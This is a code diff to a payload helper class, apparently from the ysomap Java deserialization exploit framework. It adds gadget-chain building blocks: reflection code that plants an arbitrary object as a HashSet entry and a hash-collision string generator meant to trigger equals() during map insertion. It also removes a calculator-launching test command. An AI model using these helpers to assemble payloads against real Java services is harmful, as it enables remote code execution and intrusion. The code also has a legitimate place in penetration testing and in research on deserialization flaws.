@@ -5,10 +5,7 @@ import com.sun.org.apache.xpath.internal.objects.XString;
 import org.apache.shiro.subject.SimplePrincipalCollection;
 
 import java.io.IOException;
-import java.lang.reflect.Array;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.Proxy;
+import java.lang.reflect.*;
 import java.util.*;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
@@ -91,6 +88,45 @@ public class PayloadHelper {
         return set;
     }
 
+    public static HashSet makeHashSetWithEntry(Object entry) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
+        HashSet set = new HashSet(1);
+        set.add("foo");
+        Field f = null;
+        try {
+            f = HashSet.class.getDeclaredField("map");
+        } catch (NoSuchFieldException e) {
+            f = HashSet.class.getDeclaredField("backingMap");
+        }
+        ReflectionHelper.setAccessible(f);
+        HashMap innimpl = null;
+        innimpl = (HashMap) f.get(set);
+
+        Field f2 = null;
+        try {
+            f2 = HashMap.class.getDeclaredField("table");
+        } catch (NoSuchFieldException e) {
+            f2 = HashMap.class.getDeclaredField("elementData");
+        }
+        ReflectionHelper.setAccessible(f2);
+        Object[] array = new Object[0];
+        array = (Object[]) f2.get(innimpl);
+        Object node = array[0];
+        if(node == null){
+            node = array[1];
+        }
+
+        Field keyField = null;
+        try{
+            keyField = node.getClass().getDeclaredField("key");
+        }catch(Exception e){
+            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
+        }
+        ReflectionHelper.setAccessible(keyField);
+        keyField.set(node, entry);
+
+        return set;
+    }
+
     public static Object makeTreeSetWithXString(Object obj) throws Exception {
         Object rdnEntry1 = ReflectionHelper.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
         ReflectionHelper.setFieldValue(rdnEntry1, "type", "ysomap");
@@ -102,18 +138,6 @@ public class PayloadHelper {
 
         return PayloadHelper.makeTreeSet(rdnEntry2, rdnEntry1);
     }
-
-    public static String defaultTestCommand(){
-        return "open /System/Applications/Calculator.app";
-    }
-
-//    public static ObjectGadget makeGadget(Class<? extends ObjectGadget> clazz, String type) throws GenerateErrorException {
-//        try {
-//            return clazz.newInstance();
-//        } catch (Exception e) {
-//            throw new GenerateErrorException(type, clazz.getSimpleName());
-//        }
-//    }
 
     public static String makeBCELStr(byte[] classbytes) throws IOException {
         return "$$BCEL$$" + Utility.encode(classbytes, true);
@@ -155,5 +179,45 @@ public class PayloadHelper {
                 "}catch (Exception e){\n" +
                 "}\n" +
                 "throw new Exception(localStringBuffer.toString());";
+    }
+
+
+    /**
+     * 用于创造一个拥有同样hash的对象
+     * 这样在map.put过程中将触发equal函数
+     * @param hash
+     * @return
+     */
+    public static String unhash ( int hash ) {
+        int target = hash;
+        StringBuilder answer = new StringBuilder();
+        if ( target < 0 ) {
+            // String with hash of Integer.MIN_VALUE, 0x80000000
+            answer.append("\\u0915\\u0009\\u001e\\u000c\\u0002");
+
+            if ( target == Integer.MIN_VALUE )
+                return answer.toString();
+            // Find target without sign bit set
+            target = target & Integer.MAX_VALUE;
+        }
+
+        unhash0(answer, target);
+        return answer.toString();
+    }
+
+
+    private static void unhash0 ( StringBuilder partial, int target ) {
+        int div = target / 31;
+        int rem = target % 31;
+
+        if ( div <= Character.MAX_VALUE ) {
+            if ( div != 0 )
+                partial.append((char) div);
+            partial.append((char) rem);
+        }
+        else {
+            unhash0(partial, div);
+            partial.append((char) rem);
+        }
     }
 }
